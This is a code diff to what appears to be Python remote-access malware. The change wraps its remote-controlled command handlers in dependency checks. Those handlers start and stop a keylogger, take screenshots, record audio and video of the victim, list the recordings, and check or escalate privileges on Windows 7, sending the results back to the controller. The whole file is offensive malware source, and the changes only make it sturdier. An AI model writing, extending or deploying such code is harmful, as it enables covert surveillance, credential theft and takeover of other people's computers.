@@ -10,18 +10,41 @@ import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
 
-# Import enhanced features
-try:
-    from keylogger import create_keylogger
-    from recording import create_surveillance_recorder
-    from privilege import Windows7PrivilegeEscalator
-except ImportError:
-    pass
-
-# Global variables for enhanced features
+# Import enhanced features with Python 3.4.3 compatibility
 keylogger = None
-recorder = None
+recorder = None  
 privilege_escalator = None
+
+# Import feature modules with proper error handling
+try:
+    import sys
+    import os
+    
+    # Add current directory to Python path for imports
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    if current_dir not in sys.path:
+        sys.path.insert(0, current_dir)
+    
+    # Import enhanced features
+    from features.keylogger import create_keylogger
+    KEYLOGGER_AVAILABLE = True
+except ImportError as e:
+    print("Keylogger not available: " + str(e))
+    KEYLOGGER_AVAILABLE = False
+
+try:
+    from features.recording import create_surveillance_recorder
+    RECORDING_AVAILABLE = True
+except ImportError as e:
+    print("Recording not available: " + str(e))
+    RECORDING_AVAILABLE = False
+
+try:
+    from features.privilege import Windows7PrivilegeEscalator
+    PRIVILEGE_AVAILABLE = True
+except ImportError as e:
+    print("Privilege escalation not available: " + str(e))
+    PRIVILEGE_AVAILABLE = False
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -105,9 +128,15 @@ def shell():
         # KEYLOGGER COMMANDS
         elif command == 'start_keylog':
             try:
-                if keylogger is None:
+                if not KEYLOGGER_AVAILABLE:
+                    reliable_send("Keylogger feature not available - missing dependencies")
+                elif keylogger is None:
                     keylogger = create_keylogger("keylog.txt")
-                if keylogger.start():
+                    if keylogger.start():
+                        reliable_send("Keylogger started successfully")
+                    else:
+                        reliable_send("Failed to start keylogger")
+                elif keylogger.start():
                     reliable_send("Keylogger started successfully")
                 else:
                     reliable_send("Failed to start keylogger")
@@ -116,7 +145,9 @@ def shell():
                 
         elif command == 'stop_keylog':
             try:
-                if keylogger and keylogger.stop():
+                if not KEYLOGGER_AVAILABLE:
+                    reliable_send("Keylogger feature not available")
+                elif keylogger and keylogger.stop():
                     reliable_send("Keylogger stopped successfully")
                 else:
                     reliable_send("Keylogger not running or failed to stop")
@@ -137,25 +168,33 @@ def shell():
         # RECORDING COMMANDS
         elif command == 'screenshot':
             try:
-                if recorder is None:
-                    recorder = create_surveillance_recorder("recordings")
-                success, msg = recorder.screen_recorder.take_screenshot()
-                reliable_send("Screenshot: " + msg)
+                if not RECORDING_AVAILABLE:
+                    reliable_send("Recording feature not available - missing dependencies")
+                else:
+                    if recorder is None:
+                        recorder = create_surveillance_recorder("recordings")
+                    success, msg = recorder.screen_recorder.take_screenshot()
+                    reliable_send("Screenshot: " + msg)
             except Exception as e:
                 reliable_send("Screenshot error: " + str(e))
                 
         elif command == 'start_recording':
             try:
-                if recorder is None:
-                    recorder = create_surveillance_recorder("recordings")
-                success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
-                reliable_send("Recording: " + msg)
+                if not RECORDING_AVAILABLE:
+                    reliable_send("Recording feature not available - missing dependencies")
+                else:
+                    if recorder is None:
+                        recorder = create_surveillance_recorder("recordings")
+                    success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
+                    reliable_send("Recording: " + msg)
             except Exception as e:
                 reliable_send("Recording error: " + str(e))
                 
         elif command == 'stop_recording':
             try:
-                if recorder:
+                if not RECORDING_AVAILABLE:
+                    reliable_send("Recording feature not available")
+                elif recorder:
                     success, msg = recorder.stop_surveillance()
                     reliable_send("Stop recording: " + msg)
                 else:
@@ -165,43 +204,55 @@ def shell():
                 
         elif command == 'list_recordings':
             try:
-                if recorder is None:
-                    recorder = create_surveillance_recorder("recordings")
-                recordings = recorder.list_recordings()
-                reliable_send("Recordings: " + json.dumps(recordings, indent=2))
+                if not RECORDING_AVAILABLE:
+                    reliable_send("Recording feature not available")
+                else:
+                    if recorder is None:
+                        recorder = create_surveillance_recorder("recordings")
+                    recordings = recorder.list_recordings()
+                    reliable_send("Recordings: " + json.dumps(recordings, indent=2))
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
                 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
             try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                reliable_send("Current privileges: " + privilege_escalator.current_privileges)
+                if not PRIVILEGE_AVAILABLE:
+                    reliable_send("Privilege escalation feature not available - missing dependencies")
+                else:
+                    if privilege_escalator is None:
+                        privilege_escalator = Windows7PrivilegeEscalator()
+                    reliable_send("Current privileges: " + privilege_escalator.current_privileges)
             except Exception as e:
                 reliable_send("Check privileges error: " + str(e))
                 
         elif command == 'escalate':
             try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                success, results = privilege_escalator.escalate_privileges()
-                reliable_send("Escalation result: " + str(success) + "\nDetails: " + str(results)[:1000])
+                if not PRIVILEGE_AVAILABLE:
+                    reliable_send("Privilege escalation feature not available - missing dependencies")
+                else:
+                    if privilege_escalator is None:
+                        privilege_escalator = Windows7PrivilegeEscalator()
+                    success, results = privilege_escalator.escalate_privileges()
+                    reliable_send("Escalation result: " + str(success) + "\nDetails: " + str(results)[:1000])
             except Exception as e:
                 reliable_send("Escalation error: " + str(e))
                 
         elif command == 'privesc_report':
             try:
-                if privilege_escalator is None:
-                    privilege_escalator = Windows7PrivilegeEscalator()
-                report = privilege_escalator.generate_windows7_report()
-                # Send abbreviated report to avoid overwhelming the connection
-                brief_report = {
-                    'current_privileges': report.get('current_privileges'),
-                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
-                    'total_opportunities': len(report.get('escalation_opportunities', {}))
-                }
-                reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
+                if not PRIVILEGE_AVAILABLE:
+                    reliable_send("Privilege escalation feature not available - missing dependencies")
+                else:
+                    if privilege_escalator is None:
+                        privilege_escalator = Windows7PrivilegeEscalator()
+                    report = privilege_escalator.generate_windows7_report()
+                    # Send abbreviated report to avoid overwhelming the connection
+                    brief_report = {
+                        'current_privileges': report.get('current_privileges'),
+                        'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
+                        'total_opportunities': len(report.get('escalation_opportunities', {}))
+                    }
+                    reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
             except Exception as e:
                 reliable_send("Report error: " + str(e))
                 
